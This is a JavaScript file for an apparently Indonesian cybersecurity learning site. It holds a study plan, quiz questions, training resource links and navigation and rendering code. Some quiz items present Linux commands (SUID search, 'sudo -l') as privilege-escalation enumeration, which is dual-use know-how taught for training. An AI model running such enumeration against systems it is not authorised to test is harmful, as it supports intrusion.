      "Pelajari: Hierarki file system Linux (/etc /var /usr /tmp)",
      "Latihan: Over The Wire — Bandit levels 0-5",
      "Pelajari: File permissions, users, groups (chmod, chown, sudo)",
      "Latihan: Bandit levels 6-10",
      "Pelajari: Process management, cron, systemd services",
      "Latihan: Bash scripting — tulis 3 script otomasi sederhana",
      "Review: Buat cheatsheet semua Linux command yang dipelajari"
    ]
  },
  {
    week: 3, theme: "Web Security Fundamentals", days: [
      "Pelajari: HTTP/HTTPS deep dive — headers, methods, status codes",
      "Lab: Intercept HTTP traffic dengan Burp Suite Community",
      "Pelajari: OWASP Top 10 — baca langsung di owasp.org",
      "Lab: Setup DVWA + praktik SQL injection dasar",
      "Pelajari: XSS — reflected vs stored, perbedaan dan dampak",
      "Lab: XSS labs gratis di PortSwigger Web Security Academy",
      "Review + Quiz: Uji pemahaman web security fundamentals"
    ]
  },
  {
    week: 4, theme: "Praktik Hands-On & Konsolidasi", days: [
      "TryHackMe: Selesaikan 1 easy room (tema networking)",
      "TryHackMe: Selesaikan 1 easy room (tema web vulnerability)",
      "Review: Ulangi semua catatan dari minggu 1–3",
      "Lab: Full port scan + service enumeration di test VM",
      "TryHackMe: Selesaikan 1 medium room dan tulis writeup",
      "Tulis: Ringkasan belajar 500 kata + refleksi pribadi",
      "Rencanakan: Tetapkan goals konkret untuk 30 hari berikutnya"
    ]
  }
];

const QUIZ_DATA = [
  {
    category: "Networking Basics", icon: "fa-network-wired", color: "var(--secondary)", questions: [
      { q: "Layer OSI mana yang menangani pengalamatan IP?", opts: ["Layer 2 (Data Link)", "Layer 3 (Network)", "Layer 4 (Transport)", "Layer 7 (Application)"], correct: 1, explain: "Layer 3 (Network) menangani pengalamatan IP dan routing. Layer 2 menangani alamat MAC." },
      { q: "Urutan TCP three-way handshake yang benar?", opts: ["SYN → SYN-ACK → ACK", "ACK → SYN → FIN", "SYN → ACK → FIN", "RST → SYN → ACK"], correct: 0, explain: "Handshake TCP: SYN (client) → SYN-ACK (server) → ACK (client). Membentuk koneksi full-duplex." },
      { q: "Protokol mana yang berjalan di port 443?", opts: ["HTTP", "FTP", "HTTPS", "SSH"], correct: 2, explain: "HTTPS berjalan di port 443 menggunakan TLS. HTTP berjalan di port 80 tanpa enkripsi." },
      { q: "Apa fungsi utama DNS?", opts: ["Mengenkripsi traffic", "Menerjemahkan domain ke IP", "Menetapkan alamat MAC", "Routing antar subnet"], correct: 1, explain: "DNS (Domain Name System) menerjemahkan nama domain yang human-readable ke alamat IP." }
    ]
  },
  {
    category: "Linux Commands", icon: "fa-terminal", color: "var(--primary)", questions: [
      { q: "Command mana yang menampilkan proses yang berjalan?", opts: ["ls -la", "ps aux", "netstat -an", "find / -name *"], correct: 1, explain: "'ps aux' menampilkan semua proses beserta user, PID, CPU, memory, dan command-nya." },
      { q: "Apa arti chmod 777 pada file?", opts: ["Hapus file", "Jadikan read-only", "Full permission ke semua user", "Enkripsi file"], correct: 2, explain: "chmod 777: read+write+execute untuk owner, group, dan others. Sangat tidak aman untuk file sensitif." },
      { q: "Command mencari file dengan SUID bit set?", opts: ["ls -la /usr", "find / -perm -u=s -type f", "chmod +s /file", "grep -r SUID /"], correct: 1, explain: "find / -perm -u=s -type f mencari binary SUID — kunci untuk enumerasi privilege escalation di Linux." },
      { q: "Apa yang ditampilkan 'sudo -l'?", opts: ["Uptime sistem", "User yang login", "Privilege sudo current user", "Detail login terakhir"], correct: 2, explain: "'sudo -l' menampilkan command yang boleh dijalankan dengan sudo — esensial untuk privesc enumeration." }
    ]
  },
  {
    category: "Web Vulnerabilities", icon: "fa-globe", color: "var(--warn)", questions: [
      { q: "Pertahanan utama terhadap SQL injection?", opts: ["Batasi panjang input", "Parameterized queries", "URL encoding", "Rate limiting"], correct: 1, explain: "Parameterized queries (prepared statements) memisahkan code dari data — pertahanan definitif terhadap SQLi." },
      { q: "Jenis XSS mana yang tersimpan di database?", opts: ["Reflected XSS", "DOM-based XSS", "Stored XSS", "Blind XSS"], correct: 2, explain: "Stored XSS tersimpan di DB dan memengaruhi SEMUA user yang melihat halaman terinfeksi — paling berbahaya." },
      { q: "Apa yang dieksploitasi oleh CSRF?", opts: ["Database SQL", "Kepercayaan server pada sesi auth", "HTTP tidak terenkripsi", "JavaScript engine"], correct: 1, explain: "CSRF mengeksploitasi kepercayaan server pada browser user terautentikasi untuk melakukan aksi tidak sah." },
      { q: "OWASP kategori mana yang mencakup password lemah?", opts: ["A01: Broken Access Control", "A02: Cryptographic Failures", "A07: ID & Auth Failures", "A09: Logging Failures"], correct: 2, explain: "A07 mencakup password lemah, credential stuffing, dan masalah manajemen sesi autentikasi." }
    ]
  },
  {
    category: "Security Fundamentals", icon: "fa-shield-halved", color: "var(--accent)", questions: [
      { q: "'I' dalam CIA Triad singkatan dari?", opts: ["Intelligence", "Integrity", "Identity", "Infrastructure"], correct: 1, explain: "CIA: Confidentiality, Integrity, Availability. Integrity = data akurat dan tidak dimodifikasi tanpa izin." },
      { q: "Algoritma hash mana yang sudah dianggap RUSAK?", opts: ["SHA-256", "bcrypt", "MD5", "SHA-3"], correct: 2, explain: "MD5 secara kriptografi sudah broken — collision attacks telah didemonstrasikan. Jangan gunakan untuk security." },
      { q: "Definisi 'principle of least privilege'?", opts: ["Enkripsi data sensitif", "Berikan akses minimum yang diperlukan", "Catat semua aksi user", "Gunakan password kuat"], correct: 1, explain: "Least privilege: user/sistem hanya mendapat izin minimum yang dibutuhkan untuk menjalankan fungsinya." },
      { q: "Apa tugas utama SOC analyst?", opts: ["Kembangkan aplikasi", "Monitor & respons terhadap security alerts", "Rancang infrastruktur jaringan", "Lakukan penetration test"], correct: 1, explain: "SOC analyst memonitor SIEM, melakukan triage alert, dan mengkoordinasikan incident response." }
    ]
  }
];

const RESOURCES = {
  "Platform Latihan": [
    { name: "Hack The Box", desc: "CTF-style machine challenges, sangat realistis — standar industri", url: "https://hackthebox.com", icon: "fa-cube", badge: "Top Pick" },
    { name: "TryHackMe", desc: "Guided rooms semua level, berbasis browser — perfect untuk pemula", url: "https://tryhackme.com", icon: "fa-flag", badge: "Beginner Friendly" },
    { name: "PortSwigger Academy", desc: "Lab web security terbaik — dan 100% GRATIS", url: "https://portswigger.net/web-security", icon: "fa-spider", badge: "Gratis" },
    { name: "OverTheWire", desc: "Wargames klasik untuk Linux dan networking fundamentals", url: "https://overthewire.org", icon: "fa-terminal", badge: "CLI Focus" },
    { name: "Redlimit CTF Lab", desc: "Platform CTF Bug Bounty sebagai sarana pengembangan keterampilan di bidang cybersecurity.", url: "https://hack.redlimit.id/", icon: "fa-trophy", badge: "Beginner Friendly" },
    { name: "PicoCTF", desc: "CTF kompetisi untuk pemula oleh Carnegie Mellon University", url: "https://picoctf.org", icon: "fa-trophy", badge: "Beginner" }
  ],
  "Referensi Penting": [
    { name: "OWASP", desc: "Sumber daya keamanan web definitif — wajib dibaca semua orang", url: "https://owasp.org", icon: "fa-book-open", badge: "Esensial" },
    { name: "MITRE ATT&CK", desc: "Database taktik & teknik adversary — framework standar industri", url: "https://attack.mitre.org", icon: "fa-crosshairs", badge: "Esensial" },
    { name: "GTFOBins", desc: "Unix binaries untuk privilege escalation — referensi privesc", url: "https://gtfobins.github.io", icon: "fa-arrow-up", badge: "PrivEsc" },
    { name: "ExploitDB", desc: "Arsip eksploit publik dan CVE — untuk riset kerentanan", url: "https://exploit-db.com", icon: "fa-bomb", badge: "Research" }
  ],
  "YouTube Channels": [
    { name: "NetworkChuck", desc: "Networking dan konten keamanan untuk pemula — entertaining", url: "https://youtube.com/@NetworkChuck", icon: "fa-play", badge: "Beginner" },
    { name: "John Hammond", desc: "CTF walkthroughs dan analisis malware mendalam", url: "https://youtube.com/@_JohnHammond", icon: "fa-play", badge: "Intermediate" },
    { name: "TCM Security (Heath Adams)", desc: "Kursus ethical hacking praktis berkualitas tinggi", url: "https://youtube.com/@TCMSecurityAcademy", icon: "fa-play", badge: "Practical" },
    { name: "IppSec", desc: "Walkthrough Hack The Box machine — teknik advanced", url: "https://youtube.com/@ippsec", icon: "fa-play", badge: "Advanced" }
  ],
  "Dokumentasi Resmi": [
    { name: "Kali Linux Docs", desc: "Dokumentasi resmi distribusi Kali Linux", url: "https://www.kali.org/docs/", icon: "fa-book", badge: "Official" },
    { name: "NIST Cybersecurity", desc: "Framework dan panduan keamanan dari NIST US", url: "https://csrc.nist.gov", icon: "fa-building", badge: "Standard" }
  ]
};

/* ================================================================
   NAVIGATION — Hash Routing
   URL: index.html#dashboard | index.html#login | etc.
   Back/forward button, bookmark, deep-link semua berfungsi.
================================================================ */
const SECTION_MAP = {
  hero: 'sec-hero', dashboard: 'sec-dashboard', roadmap: 'sec-roadmap',
  modules: 'sec-modules', labs: 'sec-labs', quiz: 'sec-quiz',
  tools: 'sec-tools', career: 'sec-career', certs: 'sec-certs',
  mindset: 'sec-mindset', planner: 'sec-planner', resources: 'sec-resources',
  login: 'sec-login', register: 'sec-register', about: 'sec-about'
};
const BREADCRUMB_MAP = {
  hero: 'Home', dashboard: 'Dashboard', roadmap: 'Learning Roadmap',
  modules: 'Module Library', labs: 'Hands-On Labs', quiz: 'Knowledge Quiz',
  tools: 'Security Tools', career: 'Career Paths', certs: 'Certifications',
  mindset: 'Mindset', planner: 'Study Planner', resources: 'Resources',
  login: 'Login', register: 'Register', about: 'About'
};

const sectionInited = {};

/* Core: tampilkan section + update URL hash (tanpa trigger hashchange) */
function showSection(id) {
  if (!SECTION_MAP[id]) return;

  // Update URL hash — pushState agar history stack benar
  const newHash = '#' + id;
  if (location.hash !== newHash) {
    history.pushState({ section: id }, '', newHash);
  }

  _renderSection(id);
}

/* Internal render — dipanggil oleh showSection DAN popstate */
function _renderSection(id) {
  if (!SECTION_MAP[id]) id = 'hero'; // fallback

  const protectedSections = ['dashboard', 'planner', 'quiz'];
  const isLoggedIn = typeof VeloraSec !== 'undefined' && VeloraSec.Token && VeloraSec.Token.isLoggedIn();
  if (protectedSections.includes(id) && !isLoggedIn) {
      id = 'hero';
      history.replaceState({ section: 'hero' }, '', '#hero');
  }

  // Dashboard selalu di-refresh karena menampilkan data live dari API
  if (id === 'dashboard') sectionInited['dashboard'] = false;

  // Hide all
  Object.values(SECTION_MAP).forEach(sid => {
    const el = document.getElementById(sid);
    if (el) el.style.display = 'none';
  });

  // Show & animate target
  const target = document.getElementById(SECTION_MAP[id]);
  if (target) {
    target.style.display = 'block';
    target.classList.remove('fade-in');
    void target.offsetWidth;
    target.classList.add('fade-in');
  }

  // Update active nav
  document.querySelectorAll('.nav-item[data-section]').forEach(n => {
    n.classList.toggle('active', n.dataset.section === id);
  });

  // Update breadcrumb
  const bc = document.getElementById('breadcrumb');
  if (bc) bc.textContent = `System / ${BREADCRUMB_MAP[id] || id}`;

  // Update document title
  document.title = `VeloraSec | ${BREADCRUMB_MAP[id] || id}`;

  closeSidebar();

  // Lazy init section content
  if (!sectionInited[id]) {
    sectionInited[id] = true;
    initSection(id);
  }
}

function initSection(id) {
  const map = {
    dashboard: buildDashboard, roadmap: buildRoadmap,
    modules: buildModules, labs: buildLabs, quiz: buildQuiz,
    tools: buildTools, career: buildCareer, certs: buildCerts,
    mindset: buildMindset, planner: buildPlanner, resources: buildResources
  };
  if (map[id]) map[id]();
}

/* Back / Forward browser button */
window.addEventListener('popstate', e => {
  const id = e.state?.section || _hashToSection();
  _renderSection(id);
});

/* Parse hash dari URL */
function _hashToSection() {
  const hash = location.hash.replace('#', '').trim();
  return SECTION_MAP[hash] ? hash : 'hero';
}

/* ================================================================
   AUTH NAV & LOGOUT
================================================================ */
function updateAuthNav() {
  const navLogin = document.getElementById('nav-login');
  const navRegister = document.getElementById('nav-register');
  const navLogout = document.getElementById('nav-logout');
  if (!navLogin || !navRegister || !navLogout) return;

  // Jika TokenManager dan SessionManager belum load, asumsikan belum login
  const isLoggedIn = typeof TokenManager !== 'undefined' ? TokenManager.isLoggedIn() : false;
  
  if (isLoggedIn) {
    navLogin.style.display = 'none';
    navRegister.style.display = 'none';
    navLogout.style.display = 'flex';
  } else {
    navLogin.style.display = 'flex';
    navRegister.style.display = 'flex';
    navLogout.style.display = 'none';
  }
}

function handleLogout() {
  const modal = document.getElementById('logout-modal');
  if (modal) modal.classList.add('show');
}

function closeLogoutModal(e) {
  const modal = document.getElementById('logout-modal');
  if (modal) modal.classList.remove('show');
}

async function executeLogout() {
  closeLogoutModal();
  try {
    if (typeof VeloraSec !== 'undefined' && VeloraSec.API && VeloraSec.API.Auth) {
      await VeloraSec.API.Auth.logout();
    }
  } catch (err) {
    console.warn("API Logout failed, clearing local session anyway.", err);
  } finally {
    if (typeof SessionManager !== 'undefined') {
      SessionManager.clearAll();
    } else if (typeof TokenManager !== 'undefined') {
      TokenManager.clear();
      if (typeof VELORASEC_CONFIG !== 'undefined') {
        localStorage.removeItem(VELORASEC_CONFIG.USER_KEY);
      }
    } else {
      // Fallback manual if managers are somehow not loaded
      localStorage.removeItem('vs_access_token');
      localStorage.removeItem('vs_refresh_token');
      localStorage.removeItem('vs_user');
    }
    localStorage.removeItem('cyb-xp');
    sessionStorage.clear();
    
    history.replaceState({ section: 'hero' }, '', '#hero');
    _renderSection('hero');
    if (typeof startTyping === 'function') startTyping();
    updateAuthNav();
  }
}

// Call on initial load
window.addEventListener('DOMContentLoaded', updateAuthNav);

/* ================================================================
   SIDEBAR
================================================================ */
function toggleSidebar() {
  const sb = document.getElementById('sidebar');
  const ov = document.getElementById('sidebar-overlay');
  const open = sb.classList.toggle('open');
  ov.classList.toggle('show', open);
}
function closeSidebar() {
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebar-overlay').classList.remove('show');
}
document.addEventListener('keydown', e => { 
  if (e.key === 'Escape') {
    closeSidebar();
    closeLogoutModal();
  }
});

/* ================================================================
   PARTICLES
================================================================ */
function buildParticles() {
  const c = document.getElementById('particles');
  const cols = ['var(--primary)', 'var(--secondary)', 'var(--accent)'];
  for (let i = 0; i < 18; i++) {
    const p = document.createElement('div');
    p.className = 'particle';
    const sz = 1 + Math.random() * 2;
    p.style.cssText = `width:${sz}px;height:${sz}px;left:${Math.random() * 100}vw;`
      + `animation-duration:${9 + Math.random() * 14}s;animation-delay:${Math.random() * 12}s;`
      + `background:${cols[i % 3]};`;
    c.appendChild(p);
  }
}

/* ================================================================
   TYPING
================================================================ */
function startTyping() {
  const phrases = [
    'From Beginner to Practical Security Analyst',
    'Learn. Practice. Defend.',
    'Hack Ethically. Think Deeply.',
    'Security is a Mindset, Not a Toolset.',
    'Build real skills, not just certifications.'
  ];
  const el = document.getElementById('typing-target');
  if (!el) return;
  let pi = 0, ci = 0, del = false;
  (function tick() {
    const phrase = phrases[pi];
    el.textContent = del ? phrase.slice(0, --ci) : phrase.slice(0, ++ci);
    if (!del && ci >= phrase.length) { del = true; setTimeout(tick, 2200); return; }
    if (del && ci <= 0) { del = false; pi = (pi + 1) % phrases.length; }
    setTimeout(tick, del ? 35 : 65);
  })();
}

/* ================================================================
   HELPERS
================================================================ */
function esc(s) {
  return String(s || '')
    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function diffDots(d) {
  return `<div class="diff-dots">${[1, 2, 3, 4, 5].map(i => `<div class="dd ${i <= d ? 'on' : 'off'}"></div>`).join('')}</div>`;
}

function codeBlock(code) {
  // Using regular text generation since JSX isn't standard JS
  return `<div class="code-block">
    <button class="copy-btn" onclick="copyCode(this)" type="button">COPY</button>
    <pre>${esc(code)}</pre>
  </div>`;
}

// FIX: clipboard with file:// fallback
function copyCode(btn) {
  const pre = btn.nextElementSibling;
  if (!pre) return;
  const text = pre.textContent;
  const done = () => { btn.textContent = 'COPIED!'; btn.style.background = 'rgba(0,255,204,0.25)'; setTimeout(() => { btn.textContent = 'COPY'; btn.style.background = ''; }, 2000); };
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(text).then(done).catch(() => fallbackCopy(text, done));
  } else { fallbackCopy(text, done); }
}
function fallbackCopy(text, cb) {
  const ta = Object.assign(document.createElement('textarea'), { value: text });
  ta.style.cssText = 'position:fixed;opacity:0';
  document.body.appendChild(ta);
  ta.focus(); ta.select();
  try { document.execCommand('copy'); cb(); } catch (e) { }
  document.body.removeChild(ta);
}

function toggleAcc(id, header) {
  const body = document.getElementById(id);
  if (!body) return;
  const open = body.classList.toggle('open');
  const ch = header.querySelector('.acc-chevron');
  if (ch) ch.style.transform = open ? 'rotate(180deg)' : 'rotate(0deg)';
}

/* ================================================================
   ANIMATION UTILITIES
================================================================ */
function animCounter(id, to, dur) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = 0;
  const start = performance.now();
  (function step(now) {
    const p = Math.min((now - start) / dur, 1);
    const e = 1 - Math.pow(1 - p, 3);
    el.textContent = Math.round(to * e);
    if (p < 1) requestAnimationFrame(step);
  })(performance.now());
}

function animBar(id, pct) {
  const el = document.getElementById(id);
  if (!el) return;
  el.style.width = '0%';
  requestAnimationFrame(() => {
    el.style.transition = 'width 1.3s cubic-bezier(0.4,0,0.2,1)';
    el.style.width = (pct || 0) + '%';
  });
}

function animCircle(pct) {
  const circle = document.getElementById('progressCircle');
  const label  = document.getElementById('circPct');
  if (!circle || !label) return;
  const circ = 2 * Math.PI * 50;
  circle.style.strokeDashoffset = circ;
  label.textContent = '0%';
  setTimeout(() => {
    circle.style.strokeDashoffset = circ * (1 - (pct || 0) / 100);
    const dur = 1400, start = performance.now();
    (function step(now) {
      const p = Math.min((now - start) / dur, 1);
      label.textContent = Math.round((pct || 0) * (1 - Math.pow(1 - p, 3))) + '%';
      if (p < 1) requestAnimationFrame(step);
    })(performance.now());
  }, 120);
}

function buildLevelBars(arg) {
  const totalPct = typeof arg === 'number' ? arg : (arg.completion_pct || 0);
  const levels = [
    { name: 'L1: Fundamentals', color: '#22c55e' },
    { name: 'L2: Networking',   color: '#00bfff' },
    { name: 'L3: Cyber Core',   color: '#8b5cf6' },
    { name: 'L4: Web Security', color: '#f59e0b' },
    { name: 'L5: Sys Attacks',  color: '#ef4444' },
    { name: 'L6: Defensive',    color: '#00ffcc' },
    { name: 'L7: Advanced',     color: '#ec4899' }
  ];
  let remaining = totalPct;
  const pctPerLevel = 100 / levels.length;
  const mapped = levels.map(function(l) {
    var pct = 0;
    if (remaining >= pctPerLevel) { pct = 100; remaining -= pctPerLevel; }
    else if (remaining > 0) { pct = Math.round((remaining / pctPerLevel) * 100); remaining = 0; }
    return { name: l.name, color: l.color, pct: pct };
  });
  const el = document.getElementById('levelBars');
  if (!el) return;
  el.innerHTML = mapped.map(function(l) {
    return '<div>' +
      '<div style="display:flex;justify-content:space-between;margin-bottom:5px;font-size:12px">' +
        '<span>' + l.name + '</span>' +
        '<span style="color:' + l.color + '">' + l.pct + '%</span>' +
      '</div>' +
      '<div class="progress-wrap">' +
        '<div class="progress-fill" style="width:' + l.pct + '%;background:linear-gradient(90deg,' + l.color + '88,' + l.color + ')"></div>' +
      '</div>' +
    '</div>';
  }).join('');
}

/* ================================================================
   DASHBOARD
================================================================ */
async function buildDashboard() {
  try {
    const summary = await VeloraSec.API.Dashboard.getSummary();

    let compCount = 0;
    let totalMods = typeof MODULES !== 'undefined' ? MODULES.length : 10;
    let modPct = 0;

    try {
      if (typeof VeloraSec !== 'undefined' && VeloraSec.Token && VeloraSec.Token.isLoggedIn()) {
        const pResp = await VeloraSec.API.Progress.getAll();
        const prog = pResp.progress || [];
        
        const uniqueCompleted = new Set();
        prog.forEach(p => {
          if (p.is_completed) uniqueCompleted.add(p.module_id);
        });
        
        compCount = uniqueCompleted.size;
        modPct = Math.round((compCount / totalMods) * 100) || 0;
      }
    } catch(err) {
      console.warn('[VeloraSec] Failed to load module progress for dashboard', err);
    }

    const plannerCompleted = summary.completed_tasks || 0;
    const plannerTotal = summary.total_tasks || 0;
    
    const overallCompleted = plannerCompleted + compCount;
    const overallTotal = plannerTotal + totalMods;
    const overallPercent = overallTotal > 0 ? Math.round((overallCompleted / overallTotal) * 100) : 0;

    const cntEl = document.getElementById('cnt-completed');
    if (cntEl && cntEl.nextElementSibling) {
      cntEl.nextElementSibling.textContent = 'of ' + plannerTotal + ' tasks';
    }

    buildLevelBars(overallPercent);

    requestAnimationFrame(function() {
      animCounter('cnt-completed', plannerCompleted, 900);
      animCounter('cnt-streak',    summary.streak_days || 0, 700);
      setTimeout(function() {
        animBar('pb-completed', summary.completion_pct || 0);
        animBar('pb-streak',    (summary.streak_days || 0) * 10);
        animCircle(overallPercent);
      }, 120);
    });

    var xpEl = document.getElementById('totalXP');
    if (xpEl) xpEl.textContent = summary.total_xp || 0;

    buildActivity(summary.recent_activity || []);

    const cards = document.querySelectorAll('.dash-top .glass-card');
    if (cards.length >= 5) {
      const estCard = cards[4];
      estCard.innerHTML = `
        <div style="font-size:10px;color:var(--muted);letter-spacing:2px;margin-bottom:8px">MODULES</div>
        <div class="stat-num" style="color:var(--accent);font-size:22px" id="cnt-modules">0</div>
        <div style="font-size:11px;color:var(--muted);margin-bottom:10px">of ${totalMods} completed</div>
        <div class="progress-wrap"><div class="progress-fill pg-teal" id="pb-modules" style="width:0%"></div></div>
      `;
      setTimeout(() => {
        animCounter('cnt-modules', compCount, 800);
        animBar('pb-modules', modPct);
      }, 150);
    }

  } catch (err) {
    console.warn('[VeloraSec] Dashboard load failed:', err);
  }
}

function buildActivity(items) {
  items = items || [];
  const el = document.getElementById('recentActivity');
  if (!el) return;

  if (!items.length) {
    el.innerHTML = '<div style="color:var(--muted);font-size:12px;text-align:center;padding:20px">Belum ada aktivitas.</div>';
    return;
  }

  el.innerHTML = items.map(function(a) {
    var isPlanner = a.type === 'planner';
    var icon  = isPlanner ? 'fa-calendar-check' : 'fa-check';
    var title = isPlanner ? 'Selesai: Task ' + a.task_key : 'Selesai: ' + (a.task_key || 'Tugas');
    var d = new Date(a.timestamp);
    var timeStr = isNaN(d.getTime()) ? 'Baru saja' : d.toLocaleDateString('id-ID', { hour: '2-digit', minute: '2-digit' });
    return '<div style="display:flex;gap:12px;margin-bottom:12px;align-items:flex-start">' +
      '<div style="width:28px;height:28px;border-radius:6px;background:rgba(0,255,204,0.1);color:var(--primary);display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0">' +
        '<i class="fas ' + icon + '"></i>' +
      '</div>' +
      '<div>' +
        '<div style="font-size:12px;font-weight:700;margin-bottom:3px">' + title + '</div>' +
        '<div style="font-size:10px;color:var(--muted)"><i class="fas fa-clock" style="margin-right:4px"></i>' + timeStr + '</div>' +
      '</div>' +
    '</div>';
  }).join('');
}

/* ================================================================
   ROADMAP
================================================================ */
function buildRoadmap() {
  const c = document.getElementById('roadmapContainer');
  if (!c) return;
  c.innerHTML = ROADMAP.map(lvl =>
    `<div class="rm-level">
      <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap">
        <span style="font-size:10px;padding:3px 11px;border-radius:20px;letter-spacing:2px;font-weight:700;background:${lvl.color}18;color:${lvl.color};border:1px solid ${lvl.color}35">LEVEL ${lvl.level}</span>
        <span style="font-size:16px;font-weight:900">${lvl.title}</span>
        <span class="badge" style="background:${lvl.color}14;color:${lvl.color};border-color:${lvl.color}35">${lvl.badge}</span>
        <span style="font-size:11px;color:var(--muted)"><i class="fas fa-clock" style="margin-right:4px"></i>${lvl.time}</span>
      </div>
      <div class="rm-nodes">
        ${lvl.topics.map(t =>
      `<div class="rm-node">
            <div class="rm-node-icon" style="background:${lvl.color}14;color:${lvl.color}"><i class="fas fa-circle-check"></i></div>
            <div>
              <div style="font-size:12px;font-weight:700;margin-bottom:3px">${t.name}</div>
              <div style="font-size:11px;color:var(--muted);line-height:1.5">${t.desc}</div>
            </div>
          </div>`
    ).join('')}
      </div>
    </div>`
  ).join('');
}

/* ================================================================
   MODULES
================================================================ */
async function buildModules() { await renderModules(MODULES); }

async function renderModules(data) {
  const list = document.getElementById('moduleList');
  if (!list) return;
  if (!data.length) { list.innerHTML = `<div style="color:var(--muted);font-size:13px;padding:20px 0">Tidak ada modul ditemukan.</div>`; return; }
  
  let completedIds = new Set();
  try {
    if (typeof VeloraSec !== 'undefined' && VeloraSec.Token && VeloraSec.Token.isLoggedIn()) {
      const resp = await VeloraSec.API.Progress.getAll();
      if (resp && resp.progress) {
        resp.progress.forEach(p => {
          if (p.is_completed) completedIds.add(p.module_id);
        });
      }
    }
  } catch (err) {
    console.warn("[VeloraSec] Failed loading module progress:", err);
  }

  const levelBadge = { beginner: 'b-green', intermediate: 'b-yellow', advanced: 'b-red' };
  list.innerHTML = data.map(m => {
    const isCompleted = completedIds.has(m.id);
    return `<div class="module-item" data-level="${m.level}" style="margin-bottom:10px">
      <div class="acc-header" onclick="toggleAcc('m-${m.id}',this)">
        <div style="display:flex;align-items:center;gap:12px;min-width:0">
          <div style="width:32px;height:32px;border-radius:8px;background:${m.color}18;color:${m.color};display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0"><i class="${m.icon}"></i></div>
          <div style="min-width:0">
            <div style="font-size:13px;font-weight:700">${esc(m.title)}</div>
            <div style="font-size:11px;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${esc(m.summary)}</div>
          </div>
        </div>
        <div style="display:flex;align-items:center;gap:8px;flex-shrink:0;margin-left:8px">
          ${isCompleted ? '<span class="badge b-teal" style="padding:4px 8px"><i class="fas fa-check"></i></span>' : ''}
          <span class="badge ${levelBadge[m.level] || 'b-green'}">${m.level}</span>
          <i class="fas fa-chevron-down acc-chevron"></i>
        </div>
      </div>
      <div class="acc-body" id="m-${m.id}">
        <div class="acc-inner">
          ${m.sections.map(s =>
      `<div style="margin-bottom:18px">
              <div style="font-size:12px;font-weight:700;color:${m.color};margin-bottom:7px;letter-spacing:1px">▸ ${esc(s.title)}</div>
              <div style="white-space:pre-wrap;line-height:1.8;font-size:12px">${esc(s.body)}</div>
              ${s.code ? codeBlock(s.code) : ''}
            </div>`
    ).join('')}
          <div style="margin-top:20px;text-align:right">
            ${isCompleted 
               ? `<button class="cyber-btn" style="background:var(--success);color:#000;padding:6px 14px;font-size:11px" disabled><i class="fas fa-check"></i> Completed</button>`
               : `<button class="cyber-btn btn-outline" style="padding:6px 14px;font-size:11px" onclick="markModuleCompleted('${m.id}', event)">✓ Mark as Completed</button>`
            }
          </div>
        </div>
      </div>
    </div>`
  }).join('');
}

async function markModuleCompleted(id, e) {
  if (e) e.stopPropagation();
  try {
    const btn = e ? e.currentTarget : null;
    if (btn) {
      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
      btn.disabled = true;
    }
    await VeloraSec.API.Progress.update(id, true);
    await buildModules(); // Refresh UI
  } catch (err) {
    console.warn("Failed to complete module", err);
    alert("Gagal memperbarui progress modul.");
    if (e && e.currentTarget) {
      e.currentTarget.innerHTML = '✓ Mark as Completed';
      e.currentTarget.disabled = false;
    }
  }
}

async function filterModules(level, btn) {
  document.querySelectorAll('.ftab').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  if (!sectionInited['modules']) { sectionInited['modules'] = true; await buildModules(); return; }
  await renderModules(level === 'all' ? MODULES : MODULES.filter(m => m.level === level));
}

/* ================================================================
   LABS
================================================================ */
function buildLabs() {
  const c = document.getElementById('labContainer');
  if (!c) return;
  const levelBadge = { basic: 'b-green', intermediate: 'b-yellow', advanced: 'b-red' };
  c.innerHTML = LABS.map(lab =>
    `<div style="margin-bottom:14px">
      <div class="acc-header" onclick="toggleAcc('lab-${lab.id}',this)">
        <div style="display:flex;align-items:center;gap:12px">
          <div style="width:36px;height:36px;border-radius:8px;background:${lab.color}18;color:${lab.color};display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0"><i class="${lab.icon}"></i></div>
          <div>
            <div style="font-size:13px;font-weight:700">${esc(lab.title)}</div>
            <span class="badge ${levelBadge[lab.level] || 'b-green'}" style="margin-top:3px;display:inline-flex">${lab.level}</span>
          </div>
        </div>
        <i class="fas fa-chevron-down acc-chevron"></i>
      </div>
      <div class="acc-body" id="lab-${lab.id}">
        <div class="acc-inner">
          <div class="box box-info" style="margin-bottom:14px">
            <i class="fas fa-bullseye box-icon" style="color:var(--secondary)"></i>
            <div><strong style="color:var(--secondary)">Objective</strong><br>${esc(lab.objective)}</div>
          </div>
          <div style="margin-bottom:14px">
            <div style="font-size:10px;color:var(--muted);letter-spacing:2px;margin-bottom:8px">TOOLS NEEDED</div>
            ${lab.tools.map(t => `<span class="tag">${esc(t)}</span>`).join('')}
          </div>
          <div style="margin-bottom:14px">
            <div style="font-size:10px;color:var(--muted);letter-spacing:2px;margin-bottom:10px">STEPS</div>
            ${lab.steps.map(s =>
      `<div style="display:flex;gap:12px;margin-bottom:12px;align-items:flex-start">
                <div style="width:22px;height:22px;border-radius:50%;background:rgba(0,255,204,0.1);border:1px solid rgba(0,255,204,0.3);display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--primary);flex-shrink:0;margin-top:3px">${s.n}</div>
                <div style="flex:1">
                  <div style="font-size:11px;color:var(--muted);margin-bottom:4px">${esc(s.desc)}</div>
                  ${s.cmd ? codeBlock(s.cmd) : ''}
                </div>
              </div>`
    ).join('')}
          </div>
          <div class="box box-success" style="margin-bottom:12px">
            <i class="fas fa-circle-check box-icon" style="color:var(--success)"></i>
            <div><strong style="color:var(--success)">Expected Result</strong><br>${esc(lab.expected)}</div>
          </div>
          <div class="box box-danger">
            <i class="fas fa-triangle-exclamation box-icon" style="color:var(--danger)"></i>
            <div><strong style="color:var(--danger)">⚠ Warning</strong><br>${esc(lab.warning)}</div>
          </div>
        </div>
      </div>
    </div>`
  ).join('');
}

/* ================================================================
   QUIZ
